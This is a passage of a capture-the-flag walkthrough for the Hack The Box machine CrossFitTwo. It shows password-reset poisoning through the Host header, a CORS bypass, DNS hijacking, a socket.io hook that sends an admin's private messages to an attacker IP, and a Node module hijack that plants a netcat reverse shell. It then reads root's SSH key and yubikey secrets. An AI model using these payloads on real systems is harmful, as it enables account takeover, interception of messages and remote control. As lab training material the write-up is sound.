+</pre></table></code></div></div><p><img data-src="/assets/img/posts/crossFitTwo/csrf-blocked.png" alt="" data-proofer-ignore></p><p>After some time get requests from victim but don’t get any response of signup.</p><p>When debug php file in local browser, found “Cross-Origin Request Blocked”</p><p><img data-src="/assets/img/posts/crossFitTwo/CORP-block.png" alt="" data-proofer-ignore></p><h3 id="cors-bypass-using-host-header"><span class="mr-2">CORS Bypass using host header</span><a href="#cors-bypass-using-host-header" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration#vulnerable-implementation-example-2">PayloadsAllTheThings</a>, There is a server misconfiguration scenario where the dot was not escaped correctly. something like this: <code class="language-plaintext highlighter-rouge">^api.example.com$</code> instead of <code class="language-plaintext highlighter-rouge">^api\.example.com$</code>. Thus, the dot can be replaced with any letter to gain access from a third-party domain.</p><p>And here this technique work for both subdomains <code class="language-plaintext highlighter-rouge">employees.crossfit.htb</code> and <code class="language-plaintext highlighter-rouge">gym.crossfit.htb</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>❯ curl <span class="nt">-s</span> <span class="nt">-q</span> <span class="nt">-v</span> <span class="nt">-H</span> <span class="s1">'Origin: http://employeesXcrossfit.htb'</span> http://crossfit-club.htb/api/auth 2&gt;&amp;1 | <span class="nb">grep</span> <span class="s2">"Origin"</span>
+<span class="o">&gt;</span> Origin: http://employeesXcrossfit.htb
+&lt; Access-Control-Allow-Origin: http://employeesXcrossfit.htb
+</pre></table></code></div></div><p>Now the another thing we can do with that misconfigured domain <code class="language-plaintext highlighter-rouge">*employees.crossfit.htb</code> in relayd config. That wildcard can be anything. if we add something like <code class="language-plaintext highlighter-rouge">anything.htb/anything-employees.crossfit.htb</code> it still resolves <code class="language-plaintext highlighter-rouge">employees.crossfit.htb</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>❯ curl <span class="nt">-s</span> <span class="nt">-X</span> <span class="s1">'POST'</span> <span class="nt">-H</span> <span class="s1">'Host: anything.htb/anything-employees.crossfit.htb'</span> <span class="nt">--data-binary</span> <span class="s1">'email=david.palmer%40crossfit.htb'</span> <span class="s1">'http://10.10.10.232/password-reset.php'</span> | <span class="nb">grep </span>alert | <span class="nb">sed</span> <span class="s1">'s/.*role="alert"&gt;\(.*\)&lt;button.*/\1/'</span>
+Only <span class="nb">local </span>hosts are allowed.
+</pre></table></code></div></div><p>but host value stored as <code class="language-plaintext highlighter-rouge">anything.htb/anything-employees.crossfit.htb</code> and browser translate host as <code class="language-plaintext highlighter-rouge">anything.htb</code> and strip anything after first domain and this time, When victim click on reset link it will redirect to <code class="language-plaintext highlighter-rouge">anything.htb</code>.</p><p>Doing same <a href="#dns-hijacking">DNS Hijacking</a> attack but this time we change host domain to <code class="language-plaintext highlighter-rouge">employeesXcrossfit.htb/employees.crossfit.htb</code>.</p><p>This time we add <code class="language-plaintext highlighter-rouge">employeesXcrossfit.htb</code> domain in unboun-control, because when user click on link with <code class="language-plaintext highlighter-rouge">employeesXcrossfit.htb/employees.crossfit.htb</code> host his browser everything after first domain and make request to <code class="language-plaintext highlighter-rouge">employeesXcrossfit.htb</code>.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>unbound-control <span class="nt">-c</span> unbound.conf <span class="nt">-s</span> 10.10.10.232 forward_add +i employeesXcrossfit.htb 10.10.15.71
+</pre></table></code></div></div><p>And change <code class="language-plaintext highlighter-rouge">fakedns</code> config rule</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>A employeesXcrossfit.htb 127.0.0.1 2%10.10.15.71
+</pre></table></code></div></div><p><img data-src="/assets/img/posts/crossFitTwo/signup-successful.png" alt="" data-proofer-ignore></p><p>python script to automate this</p><div class="language-py highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">re</span> <span class="kn">import</span> <span class="n">findall</span>
+<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
+<span class="kn">from</span> <span class="nn">subprocess</span> <span class="kn">import</span> <span class="n">Popen</span><span class="p">,</span> <span class="n">PIPE</span><span class="p">,</span> <span class="n">STDOUT</span>
+<span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">system</span>
+<span class="kn">import</span> <span class="nn">requests</span> <span class="k">as</span> <span class="n">r</span>
+
+<span class="n">websocket</span> <span class="o">=</span> <span class="s">"ws://gym.crossfit.htb/ws/"</span>
+<span class="n">url</span> <span class="o">=</span> <span class="s">"http://employees.crossfit.htb/password-reset.php"</span>
+<span class="k">def</span> <span class="nf">req_token</span><span class="p">():</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">"email"</span><span class="p">:</span> <span class="s">"david.palmer@crossfit.htb"</span><span class="p">}</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">"Connection"</span><span class="p">:</span> <span class="s">"keep-alive"</span><span class="p">,</span> <span class="s">"Host"</span><span class="p">:</span> <span class="s">"employeesXcrossfit.htb/employees.crossfit.htb"</span><span class="p">}</span>
+    <span class="n">rspn</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+    <span class="n">alert</span> <span class="o">=</span> <span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s">'role="alert"&gt;(.*?)&lt;button'</span><span class="p">,</span> <span class="n">rspn</span><span class="p">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="k">return</span> <span class="n">alert</span>
+
+
+<span class="n">fakedns</span> <span class="o">=</span> <span class="s">"/home/x00tex/git-tools/FakeDns/fakedns.py"</span>
+<span class="n">conf</span> <span class="o">=</span> <span class="s">"fakedns.conf"</span>
+
+<span class="c1"># system('unbound-control -c ./unbound.conf -s 10.10.10.232 forward_add +i ex-employees.crossfit.htb 10.10.15.71')
+</span><span class="n">system</span><span class="p">(</span><span class="s">'unbound-control -c ./unbound.conf -s 10.10.10.232 forward_add +i employeesXcrossfit.htb 10.10.15.71'</span><span class="p">)</span>
+<span class="n">out</span> <span class="o">=</span> <span class="n">Popen</span><span class="p">([</span><span class="s">'python'</span><span class="p">,</span> <span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">fakedns</span><span class="si">}</span><span class="s">'</span><span class="p">,</span> <span class="s">'-c'</span><span class="p">,</span> <span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">conf</span><span class="si">}</span><span class="s">'</span><span class="p">],</span> <span class="n">stdout</span><span class="o">=</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">STDOUT</span><span class="p">)</span>
+
+<span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+<span class="n">rspn</span> <span class="o">=</span> <span class="n">req_token</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="n">rspn</span><span class="p">)</span>
+<span class="k">if</span> <span class="s">"Reset link sent"</span> <span class="ow">in</span> <span class="n">rspn</span><span class="p">:</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">"sudo php -S 0.0.0.0:80"</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">out</span><span class="p">.</span><span class="n">kill</span><span class="p">()</span>
+    <span class="nb">exit</span><span class="p">()</span>
+</pre></table></code></div></div><h3 id="socketio-listener-hooking"><span class="mr-2">Socket.io listener hooking</span><a href="#socketio-listener-hooking" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>After login to <code class="language-plaintext highlighter-rouge">crossfit-club.htb</code> found only functional page <code class="language-plaintext highlighter-rouge">chat</code></p><p><img data-src="/assets/img/posts/crossFitTwo/socket-io.png" alt="" data-proofer-ignore></p><p>Chat function is using <code class="language-plaintext highlighter-rouge">socket.io</code> javascript api library.</p><p><strong>socket.io:</strong> Socket.IO is a JavaScript library for realtime web applications. It enables realtime, bi-directional communication between web clients and servers. It has two parts: a client-side library that runs in the browser, and a server-side library for Node.js. Both components have a nearly identical API.</p><p>server and client’s Socket object act as <code class="language-plaintext highlighter-rouge">EventEmitters</code>, you can emit with <code class="language-plaintext highlighter-rouge">socket.emit()</code> and listen with <code class="language-plaintext highlighter-rouge">socket.on()</code> for events in a bi-directional manner.</p><p>How client side socket.io script is working is, It generate 3 requests. First it set a GET event <code class="language-plaintext highlighter-rouge">listener</code> then second send a ping/message in POST <code class="language-plaintext highlighter-rouge">emit</code> request and receive server response in first GET event <code class="language-plaintext highlighter-rouge">listener</code> and Third start new GET event <code class="language-plaintext highlighter-rouge">listener</code>.</p><p>There are 2 types of chat, Global chat and Private chat.</p><p>From <code class="language-plaintext highlighter-rouge">http://crossfit-club.htb/js/app~748942c6.ead68abe.js</code> we can see all listener.</p><p><img data-src="/assets/img/posts/crossFitTwo/socket-code.png" alt="" data-proofer-ignore></p><p>If we send message to any user, we can see his reply in first GET listener response. but it is not showing in chat window.</p><p><img data-src="/assets/img/posts/crossFitTwo/socket-private-send.png" alt="" data-proofer-ignore></p><p><img data-src="/assets/img/posts/crossFitTwo/socket-private-recv.png" alt="" data-proofer-ignore></p><p>If we hook <code class="language-plaintext highlighter-rouge">private_recv</code> listener of admin account to our server, we can read admin messages.</p><p>Using the same CSRF account registration technique to trick admin to execute a javascript that executes from admin browser and hook <code class="language-plaintext highlighter-rouge">private_recv</code> to our http server and intercept all traffic that come through <code class="language-plaintext highlighter-rouge">private_recv</code> listener.</p><p><em><a href="https://www.youtube.com/watch?v=OUjdPa11tGw&amp;t=4770s">from ippsec video</a></em></p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre><span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"http://crossfit-club.htb/socket.io/socket.io.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+<span class="kd">var</span> <span class="nx">socket</span> <span class="o">=</span> <span class="nx">io</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="dl">'</span><span class="s1">http://crossfit-club.htb</span><span class="dl">'</span><span class="p">);</span>
+<span class="nx">socket</span><span class="p">.</span><span class="nx">emit</span><span class="p">(</span><span class="dl">"</span><span class="s2">user_join</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span> <span class="na">username</span> <span class="p">:</span> <span class="dl">"</span><span class="s2">admin</span><span class="dl">"</span> <span class="p">});</span>
+
+<span class="nx">socket</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="dl">"</span><span class="s2">private_recv</span><span class="dl">"</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">msg</span><span class="p">)</span> <span class="p">{</span>
+	<span class="kd">var</span> <span class="nx">req</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+	<span class="nx">req</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">http://10.10.15.71/?</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">btoa</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">msg</span><span class="p">)));</span>
+	<span class="nx">req</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+<span class="p">});</span>
+<span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</pre></table></code></div></div><p>after some time, receive message with user “David” ssh password</p><p><img data-src="/assets/img/posts/crossFitTwo/ssh-password.png" alt="" data-proofer-ignore></p><h1 id="privesc">Privesc</h1><p>User “david” is in “sysadmins” group.</p><p><img data-src="/assets/img/posts/crossFitTwo/david-groups.png" alt="" data-proofer-ignore></p><p>Searching for files where “sysadmins” group users have read/write access.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>crossfit2<span class="nv">$ </span>find / <span class="nt">-group</span> sysadmins <span class="nt">-ls</span> 2&gt;/dev/null
+1244170    4 drwxrwxr-x    3 root     sysadmins      512 Feb  3  2021 /opt/sysadmin
+</pre></table></code></div></div><p>Find a javascript file inside <code class="language-plaintext highlighter-rouge">/opt/sysadmin/server/statbot</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="nt">-rw-r--r--</span>  1 root  wheel  740 Jan 13  2021 statbot.js<span class="sb">`</span>
+</pre></table></code></div></div><ul><li>script is executing every minute and loging data in <code class="language-plaintext highlighter-rouge">/tmp/chatbot.log</code></ul><h2 id="node-module-hijack"><span class="mr-2">Node module hijack</span><a href="#node-module-hijack" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>script using 2 nodejs modules</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">WebSocket</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">ws</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">fs</span><span class="dl">'</span><span class="p">);</span>
+</pre></table></code></div></div><p>but there is no node_module directory in current folder. Whenever we create a new project and install required modules with <code class="language-plaintext highlighter-rouge">nmp</code> they installed in <code class="language-plaintext highlighter-rouge">node_modules</code> directory inside project folder. if not than used from nmp global library. you can understand nodejs folder Structures from <a href="https://docs.npmjs.com/cli/v7/configuring-npm/folders">docs.npmjs.com</a></p><ul><li>websocket module install in <code class="language-plaintext highlighter-rouge">node_modules/ws</code> directory and load from <code class="language-plaintext highlighter-rouge">node_modules/ws/index.js</code>.</ul><p>Get nodejs reverse shell from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs">PayloadsAllTheThings</a></p><p>user “david” have write access in <code class="language-plaintext highlighter-rouge">/opt/sysadmin</code> directory.</p><p>Create recursive directry <code class="language-plaintext highlighter-rouge">node_modules/ws/</code> and inside this folder create <code class="language-plaintext highlighter-rouge">index.js</code> file with reverse shell.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="nb">mkdir</span> <span class="nt">-p</span> /opt/sysadmin/node_modules/ws/
+<span class="nb">cat</span> <span class="o">&lt;&lt;</span> <span class="no">EOF</span><span class="sh"> &gt; /opt/sysadmin/node_modules/ws/index.js
+require('child_process').exec('rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.15.71 4141 &gt;/tmp/f')
+</span><span class="no">EOF
+</span></pre></table></code></div></div><p><img data-src="/assets/img/posts/crossFitTwo/node-rev-shell.png" alt="" data-proofer-ignore></p><p>Got shell as user “john”</p><p>User “david” is in “staff” group.</p><p><img data-src="/assets/img/posts/crossFitTwo/john-groups.png" alt="" data-proofer-ignore></p><p>Searching for files where “staff” group users have read/write access.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>crossfit2<span class="nv">$ </span>find / <span class="nt">-group</span> staff <span class="nt">-ls</span> 2&gt;/dev/null
+1481580   20 <span class="nt">-rwsr-s---</span>    1 root     staff        9024 Jan  5  2021 /usr/local/bin/log
+</pre></table></code></div></div><p>Find a suid binary inside owned by “staff” group.</p><p>This binary can read log files.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>crossfit2<span class="nv">$ </span>/usr/local/bin/log
+
+<span class="k">*</span> LogReader v0.1
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Usage: /usr/local/bin/log &lt;log file to <span class="nb">read</span><span class="o">&gt;</span>
+</pre></table></code></div></div><p>Binary is reading every file inside <code class="language-plaintext highlighter-rouge">/var</code> directory, but we can not read any file out side <code class="language-plaintext highlighter-rouge">/var</code> directory.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre>crossfit2<span class="nv">$ </span>/usr/local/bin/log /var/unbound/etc/unbound.conf
+
+<span class="k">*</span> LogReader v0.1
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Log size: 777
+
+server:
+	interface: 127.0.0.1
+	interface: ::1
+
+<span class="c">#... [snip] ...</span>
+</pre></table></code></div></div><p>Because bianry is using <a href="https://man.openbsd.org/unveil.2"><code class="language-plaintext highlighter-rouge">unvail</code></a> function to set <code class="language-plaintext highlighter-rouge">/var</code> direcotry</p><p><img data-src="/assets/img/posts/crossFitTwo/set-var.png" alt="" data-proofer-ignore></p><p><img data-src="/assets/img/posts/crossFitTwo/call-unveil.png" alt="" data-proofer-ignore></p><p>When searching for <code class="language-plaintext highlighter-rouge">openbsd /var/backup</code> first result is <code class="language-plaintext highlighter-rouge">changelist</code></p><p><img data-src="/assets/img/posts/crossFitTwo/google-search.png" alt="" data-proofer-ignore></p><p>Form <a href="https://man.openbsd.org/changelist"><code class="language-plaintext highlighter-rouge">changelist</code></a> description: “The <code class="language-plaintext highlighter-rouge">/etc/changelist</code> file is a simple text file containing the names of files to be backed up and checked for modification by the system security script. It is checked daily by the /etc/daily script. Each line of the file contains the name of a file, specified by its absolute pathname, one per line. By default, configuration files in <code class="language-plaintext highlighter-rouge">/etc</code>, <code class="language-plaintext highlighter-rouge">/root</code>, and <code class="language-plaintext highlighter-rouge">/var</code> are added during system install. Backup files are held in the directory <code class="language-plaintext highlighter-rouge">/var/backups</code>”.</p><ul><li><code class="language-plaintext highlighter-rouge">/etc/changelist</code> file contains root ssh key <code class="language-plaintext highlighter-rouge">/root/.ssh/id_rsa</code> in the list.</ul><p>And from same <code class="language-plaintext highlighter-rouge">/etc/changelist</code> man page, how files stored in the <code class="language-plaintext highlighter-rouge">/var/backups</code> direcotry: “For example, the system shell database, <code class="language-plaintext highlighter-rouge">/etc/shells</code>, is held as /var/backups/etc_shells.current. When this file is modified, it is renamed to <code class="language-plaintext highlighter-rouge">/var/backups/etc_shells.backup</code> and the new version becomes <code class="language-plaintext highlighter-rouge">/var/backups/etc_shells.current</code>. Thereafter, these files are rotated”.</p><ul><li><code class="language-plaintext highlighter-rouge">/root/.ssh/id_rsa</code> conatins <code class="language-plaintext highlighter-rouge">+</code> that means it is modified. That means file stored in <code class="language-plaintext highlighter-rouge">/var/backups</code> as <code class="language-plaintext highlighter-rouge">root_.ssh_id_rsa.current</code>. We can read it with <code class="language-plaintext highlighter-rouge">/usr/local/bin/log</code> from <code class="language-plaintext highlighter-rouge">/var/backups/root_.ssh_id_rsa.current</code></ul><h2 id="yubikey"><span class="mr-2">yubikey</span><a href="#yubikey" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Try to login with root ssh key, it’s asking for passsowrd. checking ssh debug logs, ssh login use 2 Authentication method <code class="language-plaintext highlighter-rouge">publickey</code> and <code class="language-plaintext highlighter-rouge">password</code>.</p><p><img data-src="/assets/img/posts/crossFitTwo/root-ssh-error.png" alt="" data-proofer-ignore></p><p>from <code class="language-plaintext highlighter-rouge">etc/ssh/sshd_config</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>Match User root
+	AuthenticationMethods publickey,password
+</pre></table></code></div></div><p>And <code class="language-plaintext highlighter-rouge">/etc/login.conf</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>daemon:<span class="se">\</span>
+<span class="c">#... [snip] ...</span>
+	:auth-ssh<span class="o">=</span>yubikey:<span class="se">\</span>
+</pre></table></code></div></div><p>ssh Authentication required passowrd for root and that password is a yubikey.</p><p><strong>YubiKey</strong> is a hardware authentication device manufactured by Yubico.</p><p>First time Configuration generate 2 files <code class="language-plaintext highlighter-rouge">username.uid</code> and <code class="language-plaintext highlighter-rouge">username.key</code></p><p>from <a href="http://man.openbsd.com/login_yubikey.8">login_yubikey</a> man page: “<code class="language-plaintext highlighter-rouge">login_yubikey</code> will read the user’s UID (12 hex digits) from the file <code class="language-plaintext highlighter-rouge">user.uid</code>, the user’s key (32 hex digits) from <code class="language-plaintext highlighter-rouge">user.key</code>, and the user’s last-use counter from <code class="language-plaintext highlighter-rouge">user.ctr</code> in the <code class="language-plaintext highlighter-rouge">/var/db/yubikey</code> directory.</p><p>So when we login to ssh and enter password, <code class="language-plaintext highlighter-rouge">login_yubikey</code> increment user’s login counter and verify entered passowrd based on above parameters.</p><p>We can read these file with <code class="language-plaintext highlighter-rouge">/usr/local/bin/log</code> bianry.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>/usr/local/bin/log /var/db/yubikey/root.uid
+/usr/local/bin/log /var/db/yubikey/root.key
+/usr/local/bin/log /var/db/yubikey/root.ctr
+</pre></table></code></div></div><p>There are multiple scripts all tool to generate yubikey OTP.</p><ul><li><a href="https://github.com/dorchain/yubisim">yubisim</a>: writen in java<ul><li>require java8, which can be enable (if installed) with <code class="language-plaintext highlighter-rouge">sudo update-alternatives --config java</code> and <code class="language-plaintext highlighter-rouge">sudo update-alternatives --config javac</code><li>require “Public ID” which is yubikey device ID</ul><li><a href="https://developers.yubico.com/yubico-c/Releases/">yubico-c</a>: written in c<ul><li>require <code class="language-plaintext highlighter-rouge">asciidoc</code> and compile from source.</ul><li><code class="language-plaintext highlighter-rouge">yubico-c</code> technique from <a href="https://0xdf.gitlab.io/2021/08/14/htb-crossfittwo.html#ssh-yubikey-login">0xdf’s walkthrough</a><li>python script form <a href="https://youtu.be/Ln40QxOacTI?t=2035">xct’s video</a></ul><p><em>Don’t understand it completely but got the root flag with xct’s python script.</em></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>hackthebox</a>, <a href='/categories/linux/'>linux</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/websocket-client/" class="post-tag no-text-decoration" >websocket client</a> <a href="/tags/sqli/" class="post-tag no-text-decoration" >sqli</a> <a href="/tags/dns/" class="post-tag no-text-decoration" >dns</a> <a href="/tags/fake-dns/" class="post-tag no-text-decoration" >fake dns</a> <a href="/tags/dns-hijacking/" class="post-tag no-text-decoration" >dns hijacking</a> <a href="/tags/relayd/" class="post-tag no-text-decoration" >relayd</a> <a href="/tags/dns-rebinding/" class="post-tag no-text-decoration" >dns rebinding</a> <a href="/tags/unbound/" class="post-tag no-text-decoration" >unbound</a> <a href="/tags/cssrf/" class="post-tag no-text-decoration" >cssrf</a> <a href="/tags/cors/" class="post-tag no-text-decoration" >cors</a> <a href="/tags/socket-io-hooking/" class="post-tag no-text-decoration" >Socket-io hooking</a> <a href="/tags/node-module-hijack/" class="post-tag no-text-decoration" >node module hijack</a> <a href="/tags/yubikey/" class="post-tag no-text-decoration" >yubikey</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox - CrossFitTwo - Poorduck&amp;url=https://x00tex.github.io/posts/crossFitTwo/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox - CrossFitTwo - Poorduck&amp;u=https://x00tex.github.io/posts/crossFitTwo/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://x00tex.github.io/posts/crossFitTwo/&amp;text=Hackthebox - CrossFitTwo - Poorduck" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/meta/">Hackthebox - Meta</a><li><a href="/posts/pandora/">Hackthebox - Pandora</a><li><a href="/posts/writer/">Hackthebox - Writer</a><li><a href="/posts/blunder/">Hackthebox - Blunder</a><li><a href="/posts/luanne/">Hackthebox - Luanne</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/command-injection/">command injection</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" 